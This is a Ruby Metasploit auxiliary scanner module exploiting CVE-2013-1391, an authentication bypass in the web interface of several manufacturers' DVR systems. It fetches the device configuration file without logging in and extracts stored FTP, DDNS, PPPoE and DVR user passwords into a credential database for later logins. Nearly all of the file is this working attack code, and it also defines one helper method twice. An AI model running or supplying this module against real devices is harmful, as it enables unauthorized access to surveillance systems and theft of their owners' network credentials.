# frozen_string_literal: true
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Multiple DVR Manufacturers Configuration Disclosure',
      'Description' => %q(
          This module takes advantage of an authentication bypass vulnerability at the
        web interface of multiple manufacturers DVR systems, which allows to retrieve the
        device configuration.
      ),
      'Author'      =>
        [
          'Alejandro Ramos', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'References'  =>
        [
          [ 'CVE', '2013-1391' ],
          [ 'URL', 'http://www.securitybydefault.com/2013/01/12000-grabadores-de-video-expuestos-en.html' ]
        ],
      'License'     => MSF_LICENSE
    )
  end

  def get_pppoe_credentials(conf)
    user = ""
    password = ""
    enabled = ""

    enabled = Regexp.last_match(1) if conf =~ /PPPOE_EN=(\d)/

    return if enabled == "0"

    user = Regexp.last_match(1) if conf =~ /PPPOE_USER=(.*)/

    password = Regexp.last_match(1) if conf =~ /PPPOE_PASSWORD=(.*)/

    return if user.empty? || password.empty?

    info = "PPPOE credentials for #{rhost}, user: #{user}, password: #{password}"

    report_note(host: rhost,
                data: info,
                type: "dvr.pppoe.conf",
                sname: 'pppoe',
                update: :unique_data)
  end

  def get_ddns_credentials(conf)
    hostname = ""
    user = ""
    password = ""
    enabled = ""

    enabled = Regexp.last_match(1) if conf =~ /DDNS_EN=(\d)/

    return if enabled == "0"

    hostname = Regexp.last_match(1) if conf =~ /DDNS_HOSTNAME=(.*)/

    user = Regexp.last_match(1) if conf =~ /DDNS_USER=(.*)/

    password = Regexp.last_match(1) if conf =~ /DDNS_PASSWORD=(.*)/

    return if hostname.empty?

    info = "DDNS credentials for #{hostname}, user: #{user}, password: #{password}"

    report_note(host: rhost,
                data: info,
                type: "dvr.ddns.conf",
                sname: 'ddns',
                update: :unique_data)
  end

  def get_ftp_credentials(conf)
    server = ""
    user = ""
    password = ""
    port = ""

    server = Regexp.last_match(1) if conf =~ /FTP_SERVER=(.*)/

    user = Regexp.last_match(1) if conf =~ /FTP_USER=(.*)/

    password = Regexp.last_match(1) if conf =~ /FTP_PASSWORD=(.*)/

    port = Regexp.last_match(1) if conf =~ /FTP_PORT=(.*)/

    return if server.empty?

    report_cred(
      ip: server,
      port: port,
      service_name: 'ftp',
      user: user,
      password: password,
      proof: conf.inspect
    )
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def get_dvr_credentials(conf)
    conf.scan(/USER(\d+)_USERNAME/).each do |match|
      user = ""
      password = ""
      active = ""

      user_id = match[0]

      active = Regexp.last_match(1) if conf =~ /USER#{user_id}_LOGIN=(.*)/

      user = Regexp.last_match(1) if conf =~ /USER#{user_id}_USERNAME=(.*)/

      password = Regexp.last_match(1) if conf =~ /USER#{user_id}_PASSWORD=(.*)/

      user_active = if active == "0"
                      false
                    else
                      true
                    end

      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'dvr',
        user: user,
        password: password,
        proof: "user_id: #{user_id}, active: #{active}"
      )
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(_ip)
    res = send_request_cgi('uri' => '/DVR.cfg',
                           'method' => 'GET')

    if !res || (res.code != 200) || res.body.empty? || res.body !~ /CAMERA/
      vprint_error("#{rhost}:#{rport} - DVR configuration not found")
      return
    end

    p = store_loot("dvr.configuration", "text/plain", rhost, res.body, "DVR.cfg")
    vprint_good("#{rhost}:#{rport} - DVR configuration stored in #{p}")

    conf = res.body

    get_ftp_credentials(conf)
    get_dvr_credentials(conf)
    get_ddns_credentials(conf)
    get_pppoe_credentials(conf)

    dvr_name = ""
    dvr_name = Regexp.last_match(1) if res.body =~ /DVR_NAME=(.*)/

    report_service(host: rhost, port: rport, sname: 'dvr', info: "DVR NAME: #{dvr_name}")
    print_good("#{rhost}:#{rport} DVR #{dvr_name} found")
  end
end
